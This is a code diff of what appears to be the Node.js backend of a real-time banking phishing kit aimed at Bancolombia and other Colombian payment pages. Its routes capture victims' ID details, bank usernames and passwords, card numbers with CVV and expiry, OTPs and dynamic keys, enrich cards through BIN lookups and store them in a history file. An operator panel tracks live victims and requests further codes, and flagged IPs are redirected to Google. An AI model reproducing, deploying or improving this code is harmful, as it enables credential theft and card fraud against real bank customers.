@@ -26,7 +26,7 @@ const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
 const bcSesiones = new Map();
-const pasosSesiones = new Map(); // 🔥 NUEVO MAPA PARA EL PASO ACTUAL
+const pasosSesiones = new Map();
 
 let sesionesTemporales = {};
 const SESIONES_TEMP_FILE = path.join(DATA_DIR, 'sesiones-temporales.json');
@@ -39,11 +39,7 @@ try {
 } catch (e) { console.error('Error cargando sesiones temporales', e); }
 
 function guardarSesionesTemporales() {
-    try { 
-        fs.writeFileSync(SESIONES_TEMP_FILE, JSON.stringify(sesionesTemporales, null, 2)); 
-    } catch (e) { 
-        console.error('Error guardando sesiones temporales', e); 
-    }
+    try { fs.writeFileSync(SESIONES_TEMP_FILE, JSON.stringify(sesionesTemporales, null, 2)); } catch (e) {}
 }
 
 let ipsBloqueadas = new Set();
@@ -78,12 +74,7 @@ function guardarHistorial(bancoKey, datos) {
     };
     historial.unshift(registro);
     if (historial.length > 1000) historial = historial.slice(0, 1000);
-    
-    try { 
-        fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); 
-    } catch (e) { 
-        console.error('Error guardando historial', e); 
-    }
+    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
 }
 
 let logsAdmin = [];
@@ -200,7 +191,6 @@ const server = http.createServer(async (req, res) => {
 
         const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
         
-        // 🔥 BLOQUEO GLOBAL: Si la IP está bloqueada, bloquea cualquier acción
         if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
             json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
             return;
@@ -209,11 +199,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && (url === '/admin' || url === '/admin/')) {
             try {
                 const adminPath = path.join(__dirname, 'admin.html');
-                if (!fs.existsSync(adminPath)) {
-                    res.writeHead(404, { 'Content-Type': 'text/html' });
-                    res.end('<h1>admin.html no encontrado</h1>');
-                    return;
-                }
+                if (!fs.existsSync(adminPath)) { res.writeHead(404, { 'Content-Type': 'text/html' }); res.end('<h1>admin.html no encontrado</h1>'); return; }
                 res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                 res.end(fs.readFileSync(adminPath, 'utf8'));
                 return;
@@ -226,7 +212,6 @@ const server = http.createServer(async (req, res) => {
         }
 
         if (req.method === 'GET' && url === '/check-ip') {
-            console.log('[check-ip] IP detectada:', ip, '| ¿bloqueada?:', ipsBloqueadas.has(ip));
             if (ipsBloqueadas.has(ip)) { json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip }); } else { json(res, 200, { bloqueado: false, ip }); }
             return;
         }
@@ -242,14 +227,15 @@ const server = http.createServer(async (req, res) => {
                     ultimaAccion: ultimaAccion || 'activo',
                     ultimoHeartbeat: Date.now(),
                     userAgent: (req.headers['user-agent'] || '').slice(0, 200),
-                    entroEn: previo.entroEn || Date.now()
+                    entroEn: previo.entroEn || Date.now(),
+                    paso: previo.paso || 'index' // Conservar el paso si ya existía
                 });
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
 
-        // 🔥 NUEVA RUTA PARA TRACKEAR EL PASO DEL USUARIO
+        // 🔥 ACTUALIZAR PASO (AHORA TAMBIÉN GUARDA EN USUARIOS ACTIVOS)
         if (req.method === 'POST' && url === '/bc/actualizar-paso') {
             try {
                 const { sessionId, paso } = await getBody(req);
@@ -258,6 +244,11 @@ const server = http.createServer(async (req, res) => {
                     if (!estadoSesiones.has(sessionId)) {
                         estadoSesiones.set(sessionId, 'pendiente');
                     }
+                    // Actualizamos también el mapa de usuarios activos para que se vea en la tabla principal
+                    const activo = usuariosActivos.get(sessionId) || { ip, entroEn: Date.now(), ultimoHeartbeat: Date.now() };
+                    activo.paso = paso;
+                    activo.ultimaAccion = paso; // Esto es lo que muestra la columna "Última acción"
+                    usuariosActivos.set(sessionId, activo);
                 }
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 400, { ok: false }); }
@@ -265,10 +256,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         if (req.method === 'POST' && url === '/salir') {
-            try {
-                const { sessionId } = await getBody(req);
-                if (sessionId) usuariosActivos.delete(sessionId);
-            } catch (e) {}
+            try { const { sessionId } = await getBody(req); if (sessionId) usuariosActivos.delete(sessionId); } catch (e) {}
             json(res, 200, { ok: true });
             return;
         }
@@ -302,41 +290,29 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'GET' && url === '/admin/activos') {
                 const lista = [];
                 for (const [sid, d] of usuariosActivos.entries()) {
-                    lista.push({ sessionId: sid, ip: d.ip, ultimaAccion: d.ultimaAccion, tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000), userAgent: d.userAgent, ultimoHeartbeat: d.ultimoHeartbeat });
+                    lista.push({ 
+                        sessionId: sid, 
+                        ip: d.ip, 
+                        ultimaAccion: d.ultimaAccion, // Aquí se pinta el paso
+                        tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000), 
+                        userAgent: d.userAgent, 
+                        ultimoHeartbeat: d.ultimoHeartbeat,
+                        paso: d.paso
+                    });
                 }
                 json(res, 200, { ok: true, activos: lista });
                 return;
             }
 
-            if (req.method === 'GET' && url === '/admin/historial') {
-                json(res, 200, { ok: true, historial: historial.slice(0, 200) });
-                return;
-            }
-
-            if (req.method === 'POST' && url === '/admin/historial/borrar') {
-                try {
-                    const { ids } = await getBody(req);
-                    if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; }
-                    const antes = historial.length;
-                    historial = historial.filter(h => !ids.includes(h.id));
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                    const borrados = antes - historial.length;
-                    agregarLog('borrar-historial', { usuario: payload.user, cantidad: borrados });
-                    json(res, 200, { ok: true, borrados });
-                } catch (e) { json(res, 400, { ok: false }); }
-                return;
-            }
+            if (req.method === 'GET' && url === '/admin/historial') { json(res, 200, { ok: true, historial: historial.slice(0, 200) }); return; }
+            if (req.method === 'POST' && url === '/admin/historial/borrar') { try { const { ids } = await getBody(req); if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; } const antes = historial.length; historial = historial.filter(h => !ids.includes(h.id)); try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {} const borrados = antes - historial.length; agregarLog('borrar-historial', { usuario: payload.user, cantidad: borrados }); json(res, 200, { ok: true, borrados }); } catch (e) { json(res, 400, { ok: false }); } return; }
 
             if (req.method === 'GET' && url === '/admin/sesiones') {
                 const lista = [];
                 for (const [sid, estado] of estadoSesiones.entries()) {
                     const registros = historial.filter(h => h.datos && h.datos.sessionId === sid);
                     let datos = {};
-                    if (registros.length > 0) {
-                        datos = registros[0].datos;
-                    } else {
-                        datos = datosSesiones.get(sid) || {};
-                    }
+                    if (registros.length > 0) { datos = registros[0].datos; } else { datos = datosSesiones.get(sid) || {}; }
                     const paso = pasosSesiones.get(sid) || 'index';
                     lista.push({ sessionId: sid, estado, datos, paso });
                 }
@@ -345,63 +321,27 @@ const server = http.createServer(async (req, res) => {
             }
 
             const matchSesion = url.match(/^\/admin\/sesion\/([^\/]+)$/);
-            if (req.method === 'GET' && matchSesion) {
-                const sessionId = decodeURIComponent(matchSesion[1]);
-                const datos = datosSesiones.get(sessionId) || {};
-                const estado = estadoSesiones.get(sessionId) || 'pendiente';
-                json(res, 200, { ok: true, sessionId, estado, datos });
-                return;
-            }
+            if (req.method === 'GET' && matchSesion) { const sessionId = decodeURIComponent(matchSesion[1]); const datos = datosSesiones.get(sessionId) || {}; const estado = estadoSesiones.get(sessionId) || 'pendiente'; json(res, 200, { ok: true, sessionId, estado, datos }); return; }
 
             const matchAccion = url.match(/^\/admin\/sesion\/([^\/]+)\/accion$/);
             if (req.method === 'POST' && matchAccion) {
                 const sessionId = decodeURIComponent(matchAccion[1]);
                 try {
                     const { accion } = await getBody(req);
-                    const mapEstados = {
-                        ACEPTAR: 'aceptado', RECHAZAR: 'rechazado', OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado', CC_ERROR: 'cc_error', AUTORIZAR: 'autorizacion', PEDIR_CC: 'pedir_cc', PEDIR_DATOS: 'pedir_datos', PEDIR_DINAMICA: 'pedir_dinamica'
-                    };
+                    const mapEstados = { ACEPTAR: 'aceptado', RECHAZAR: 'rechazado', OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado', CC_ERROR: 'cc_error', AUTORIZAR: 'autorizacion', PEDIR_CC: 'pedir_cc', PEDIR_DATOS: 'pedir_datos', PEDIR_DINAMICA: 'pedir_dinamica' };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
-                    
                     const estadoNuevo = mapEstados[accion];
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
-                    console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
                 } catch (e) { json(res, 400, { ok: false }); }
                 return;
             }
 
-            if (req.method === 'GET' && url === '/admin/ips-bloqueadas') {
-                json(res, 200, { ok: true, ips: [...ipsBloqueadas] });
-                return;
-            }
-
-            if (req.method === 'POST' && url === '/admin/ip/bloquear') {
-                try {
-                    const { ip: ipB } = await getBody(req);
-                    if (!ipB) { json(res, 400, { ok: false, error: 'IP requerida' }); return; }
-                    ipsBloqueadas.add(ipB);
-                    guardarIpsBloqueadas();
-                    agregarLog('bloqueo', { usuario: payload.user, ip: ipB });
-                    console.log(`[BLOQUEO] IP ${ipB} bloqueada por ${payload.user}`);
-                    json(res, 200, { ok: true, ip: ipB, total: ipsBloqueadas.size });
-                } catch (e) { json(res, 400, { ok: false }); }
-                return;
-            }
-
-            if (req.method === 'POST' && url === '/admin/ip/desbloquear') {
-                try {
-                    const { ip: ipD } = await getBody(req);
-                    ipsBloqueadas.delete(ipD);
-                    guardarIpsBloqueadas();
-                    agregarLog('desbloqueo', { usuario: payload.user, ip: ipD });
-                    console.log(`[DESBLOQUEO] IP ${ipD} desbloqueada por ${payload.user}`);
-                    json(res, 200, { ok: true, ip: ipD, total: ipsBloqueadas.size });
-                } catch (e) { json(res, 400, { ok: false }); }
-                return;
-            }
+            if (req.method === 'GET' && url === '/admin/ips-bloqueadas') { json(res, 200, { ok: true, ips: [...ipsBloqueadas] }); return; }
+            if (req.method === 'POST' && url === '/admin/ip/bloquear') { try { const { ip: ipB } = await getBody(req); if (!ipB) { json(res, 400, { ok: false, error: 'IP requerida' }); return; } ipsBloqueadas.add(ipB); guardarIpsBloqueadas(); agregarLog('bloqueo', { usuario: payload.user, ip: ipB }); json(res, 200, { ok: true, ip: ipB, total: ipsBloqueadas.size }); } catch (e) { json(res, 400, { ok: false }); } return; }
+            if (req.method === 'POST' && url === '/admin/ip/desbloquear') { try { const { ip: ipD } = await getBody(req); ipsBloqueadas.delete(ipD); guardarIpsBloqueadas(); agregarLog('desbloqueo', { usuario: payload.user, ip: ipD }); json(res, 200, { ok: true, ip: ipD, total: ipsBloqueadas.size }); } catch (e) { json(res, 400, { ok: false }); } return; }
 
             if (req.method === 'POST' && url === '/admin/sesiones/borrar') {
                 try {
@@ -413,7 +353,7 @@ const server = http.createServer(async (req, res) => {
                         datosSesiones.delete(sid);
                         usuariosActivos.delete(sid);
                         ultimaAccionSesiones.delete(sid);
-                        pasosSesiones.delete(sid); // 🔥 Borrar el paso también
+                        pasosSesiones.delete(sid);
                     });
                     agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
                     json(res, 200, { ok: true, borradas });
@@ -421,50 +361,20 @@ const server = http.createServer(async (req, res) => {
                 return;
             }
 
-            if (req.method === 'POST' && url === '/admin/logs/borrar') {
-                try {
-                    const { ids } = await getBody(req);
-                    if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; }
-                    const antes = logsAdmin.length;
-                    logsAdmin = logsAdmin.filter(l => !ids.includes(l.id));
-                    try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
-                    const borrados = antes - logsAdmin.length;
-                    agregarLog('borrar-logs', { usuario: payload.user, cantidad: borrados });
-                    json(res, 200, { ok: true, borrados });
-                } catch (e) { json(res, 400, { ok: false }); }
-                return;
-            }
-
-            if (req.method === 'POST' && url === '/admin/ips/borrar') {
-                try {
-                    const { ips } = await getBody(req);
-                    if (!Array.isArray(ips) || !ips.length) { json(res, 400, { ok: false, error: 'ips requerido' }); return; }
-                    let borradas = 0;
-                    ips.forEach(i => { if (ipsBloqueadas.delete(i)) borradas++; });
-                    guardarIpsBloqueadas();
-                    agregarLog('borrar-ips', { usuario: payload.user, cantidad: borradas, ips });
-                    json(res, 200, { ok: true, borradas });
-                } catch (e) { json(res, 400, { ok: false }); }
-                return;
-            }
-
-            if (req.method === 'GET' && url === '/admin/logs') {
-                json(res, 200, { ok: true, logs: logsAdmin.slice(0, 100) });
-                return;
-            }
-
+            if (req.method === 'POST' && url === '/admin/logs/borrar') { try { const { ids } = await getBody(req); if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; } const antes = logsAdmin.length; logsAdmin = logsAdmin.filter(l => !ids.includes(l.id)); try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {} const borrados = antes - logsAdmin.length; agregarLog('borrar-logs', { usuario: payload.user, cantidad: borrados }); json(res, 200, { ok: true, borrados }); } catch (e) { json(res, 400, { ok: false }); } return; }
+            if (req.method === 'POST' && url === '/admin/ips/borrar') { try { const { ips } = await getBody(req); if (!Array.isArray(ips) || !ips.length) { json(res, 400, { ok: false, error: 'ips requerido' }); return; } let borradas = 0; ips.forEach(i => { if (ipsBloqueadas.delete(i)) borradas++; }); guardarIpsBloqueadas(); agregarLog('borrar-ips', { usuario: payload.user, cantidad: borradas, ips }); json(res, 200, { ok: true, borradas }); } catch (e) { json(res, 400, { ok: false }); } return; }
+            if (req.method === 'GET' && url === '/admin/logs') { json(res, 200, { ok: true, logs: logsAdmin.slice(0, 100) }); return; }
             if (req.method === 'GET' && url === '/admin/stats') {
                 const pendientes = [...estadoSesiones.values()].filter(e => e === 'pendiente').length;
                 json(res, 200, { ok: true, activos: usuariosActivos.size, sesiones: estadoSesiones.size, pendientes, bloqueadas: ipsBloqueadas.size, historial: historial.length });
                 return;
             }
-
             json(res, 404, { ok: false, error: 'Ruta admin no encontrada' });
             return;
         }
 
         // ============================================================
-        // 🔥 RUTA 1: Guardar consulta inicial (EN DISCO DURO)
+        // 🔥 RUTAS PARA BANCOLOMBIA Y SUBSIDIO
         // ============================================================
         const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
         if (req.method === 'POST' && consultaMatch) {
@@ -473,47 +383,30 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
-
                 const datosPrevios = sesionesTemporales[sessionId] || {};
-                const datosCompletos = Object.assign({}, datosPrevios, {
-                    sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, ip: ip, creadoEn: new Date().toISOString()
-                });
-
+                const datosCompletos = Object.assign({}, datosPrevios, { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, ip: ip, creadoEn: new Date().toISOString() });
                 sesionesTemporales[sessionId] = datosCompletos;
                 guardarSesionesTemporales();
-
                 datosSesiones.set(sessionId, datosCompletos);
                 if (!estadoSesiones.has(sessionId)) estadoSesiones.set(sessionId, 'pendiente');
-
-                console.log(`[${bancoKey}] Consulta en disco: ${sessionId} | Tel: ${telefono}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTA 2: Confirmar pago (Guarda el PRIMER registro en historial)
-        // ============================================================
         const confirmarMatch = url.match(/^\/cc-(bogota|bucaramanga)\/confirmar-pago$/);
         if (req.method === 'POST' && confirmarMatch) {
             try {
                 const bancoKey = 'cc-' + confirmarMatch[1];
                 const { sessionId } = await getBody(req);
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
-
                 const datosCompletos = sesionesTemporales[sessionId] || {};
-                
                 guardarHistorial(bancoKey, datosCompletos);
-
-                console.log(`[${bancoKey}] Consulta guardada en historial (Paso 1): ${sessionId}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTA 3: Enviar pago (Guarda el SEGUNDO registro en historial)
-        // ============================================================
         const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
         if (req.method === 'POST' && ccMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -522,41 +415,23 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
                 if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
-
                 const infoBin = await obtenerInfoBin(tarjeta);
                 const datosPrevios = sesionesTemporales[sessionId] || {};
-
-                const datosSesion = Object.assign({}, datosPrevios, {
-                    sessionId, bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, 
-                    placa: placa || datosPrevios.placa || '', subsidio: subsidio || false, ip: ip, creadoEn: new Date().toISOString(),
-                    bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
-                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido',
-                    cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
-                });
-
+                const datosSesion = Object.assign({}, datosPrevios, { sessionId, bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa: placa || datosPrevios.placa || '', subsidio: subsidio || false, ip: ip, creadoEn: new Date().toISOString(), bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''), cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido' });
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
-                
                 let pasoActual = pasosSesiones.get(sessionId) || 'pagodesubsidio';
-                if (marca === 'PSE') pasoActual += ' (PSE)';
-                else pasoActual += ' (Tarjeta)';
+                if (marca === 'PSE') pasoActual += ' (PSE)'; else pasoActual += ' (Tarjeta)';
                 pasosSesiones.set(sessionId, pasoActual);
-
                 guardarHistorial(bancoKey, datosSesion);
-
                 delete sesionesTemporales[sessionId];
                 guardarSesionesTemporales();
-
-                console.log(`[${bancoKey}] Tarjeta guardada en historial (Paso 2): ${sessionId}`);
                 json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTA 4: Enviar OTP
-        // ============================================================
         const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
         if (req.method === 'POST' && ccOtpMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -569,18 +444,12 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-
                 guardarHistorial(bancoKey, datosCompletos);
-
-                console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
                 json(res, 200, { ok: true, sessionId, bancoKey });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTA 5: Enviar Autorización
-        // ============================================================
         const authMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-autorizacion$/);
         if (req.method === 'POST' && authMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -588,47 +457,29 @@ const server = http.createServer(async (req, res) => {
                 const bancoKey = 'cc-' + authMatch[1];
                 const { sessionId, usuario, password } = await getBody(req);
                 if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
-
                 const datosPrevios = datosSesiones.get(sessionId) || {};
-                const datosCompletos = Object.assign({}, datosPrevios, {
-                    authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString()
-                });
-
+                const datosCompletos = Object.assign({}, datosPrevios, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
                 datosSesiones.set(sessionId, datosCompletos);
                 estadoSesiones.set(sessionId, 'autorizacion_enviada');
                 ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
-
                 guardarHistorial(bancoKey, datosCompletos);
-                agregarLog('autorizacion', { sessionId, usuario });
-
-                console.log(`[${bancoKey}] Autorización: ${sessionId} → usuario=${usuario}`);
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTAS PARA BANCOLOMBIA
-        // ============================================================
         if (req.method === 'POST' && url === '/bc/enviar') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
                 const datos = await getBody(req);
                 const { sessionId, usuario, clave } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
-
-                const datosSesion = {
-                    sessionId, bancoKey: 'bancolombia', marca: 'bancolombia', identificacion: usuario, clave: clave, ip: ip, creadoEn: new Date().toISOString()
-                };
-
+                const datosSesion = { sessionId, bancoKey: 'bancolombia', marca: 'bancolombia', identificacion: usuario, clave: clave, ip: ip, creadoEn: new Date().toISOString() };
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR');
-
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, usuario, clave, ip, bancoKey: 'bancolombia' });
-
-                console.log(`[BANCOLOMBIA] Sesión iniciada: ${sessionId} | Usuario: ${usuario}`);
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -639,15 +490,10 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, nombres, tipoDoc, documento, correo, telefono, ingresos } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
-
                 const previos = bcSesiones.get(sessionId) || {};
-                bcSesiones.set(sessionId, { 
-                    ...previos, nombres, tipoDoc, documento, correo, telefono, ingresos 
-                });
-
+                bcSesiones.set(sessionId, { ...previos, nombres, tipoDoc, documento, correo, telefono, ingresos });
                 const datosSesion = datosSesiones.get(sessionId) || {};
                 datosSesiones.set(sessionId, { ...datosSesion, nombres, tipoDoc, documento, correo, telefono, ingresos });
-                
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
             return;
@@ -658,24 +504,14 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, claveDinamica, otp } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
-
                 const codigo = claveDinamica || otp;
-
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, claveDinamica: codigo });
-
-                // 🔥 Aseguramos que la sesión exista en el panel
-                if (!estadoSesiones.has(sessionId)) {
-                    estadoSesiones.set(sessionId, 'pendiente');
-                    ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-                }
-
+                if (!estadoSesiones.has(sessionId)) { estadoSesiones.set(sessionId, 'pendiente'); ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP'); }
                 const datosSesion = datosSesiones.get(sessionId) || {};
                 const datosActualizados = { ...datosSesion, claveDinamica: codigo, otp: codigo };
                 datosSesiones.set(sessionId, datosActualizados);
-                
                 guardarHistorial('bancolombia', datosActualizados);
-                
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
             return;
@@ -686,45 +522,19 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, tarjeta, titular, exp, cvv } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
-
                 const sesionData = bcSesiones.get(sessionId) || {};
                 const datosPanelPrevios = datosSesiones.get(sessionId) || {};
-                
-                const datosCompletos = { 
-                    sessionId, ...datosPanelPrevios, ...sesionData, tarjeta, titular, exp, expMes: exp, cvv,
-                    fechaCaptura: new Date().toISOString(), bancoKey: 'bancolombia'
-                };
-
-                if (tarjeta) {
-                    const infoBin = await obtenerInfoBin(tarjeta);
-                    if (infoBin) {
-                        datosCompletos.bin = infoBin.bin;
-                        datosCompletos.cardBrand = infoBin.cardBrand;
-                        datosCompletos.cardType = infoBin.cardType;
-                        datosCompletos.cardLevel = infoBin.cardLevel;
-                        datosCompletos.bankName = infoBin.bankName;
-                    }
-                }
-
-                // 🔥 LA MAGIA: Si la sesión no existe en el panel principal, la creamos
-                if (!estadoSesiones.has(sessionId)) {
-                    estadoSesiones.set(sessionId, 'pendiente');
-                    ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
-                }
-                
+                const datosCompletos = { sessionId, ...datosPanelPrevios, ...sesionData, tarjeta, titular, exp, expMes: exp, cvv, fechaCaptura: new Date().toISOString(), bancoKey: 'bancolombia' };
+                if (tarjeta) { const infoBin = await obtenerInfoBin(tarjeta); if (infoBin) { datosCompletos.bin = infoBin.bin; datosCompletos.cardBrand = infoBin.cardBrand; datosCompletos.cardType = infoBin.cardType; datosCompletos.cardLevel = infoBin.cardLevel; datosCompletos.bankName = infoBin.bankName; } }
+                if (!estadoSesiones.has(sessionId)) { estadoSesiones.set(sessionId, 'pendiente'); ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO'); }
                 datosSesiones.set(sessionId, datosCompletos);
                 guardarHistorial('bancolombia', datosCompletos);
                 bcSesiones.delete(sessionId);
-
-                console.log(`[BANCOLOMBIA] Tarjeta guardada y sesión actualizada - Usuario: ${datosCompletos.identificacion || 'N/A'} | IP: ${ip}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-        // ============================================================
-        // RUTAS GENÉRICAS PARA OTROS BANCOS
-        // ============================================================
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -735,16 +545,11 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
-                const datosSesion = {
-                    sessionId, bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token, ip, creadoEn: new Date().toISOString()
-                };
+                const datosSesion = { sessionId, bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token, ip, creadoEn: new Date().toISOString() };
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR');
-
                 guardarHistorial(bancoKey, datosSesion);
-
-                console.log(`[${bancoKey}] Nueva sesión: ${sessionId}`);
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -764,10 +569,7 @@ const server = http.createServer(async (req, res) => {
                 datosSesiones.set(sessionId, datosCompletos);
                 estadoSesiones.set(sessionId, 'token');
                 ultimaAccionSesiones.set(sessionId, 'TOKEN');
-
                 guardarHistorial(bancoKey, datosCompletos);
-
-                console.log(`[${bancoKey}] Token: ${sessionId} → ${token}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -787,10 +589,7 @@ const server = http.createServer(async (req, res) => {
                 datosSesiones.set(sessionId, datosCompletos);
                 estadoSesiones.set(sessionId, 'otp');
                 ultimaAccionSesiones.set(sessionId, 'OTP');
-
                 guardarHistorial(bancoKey, datosCompletos);
-
-                console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -800,10 +599,8 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
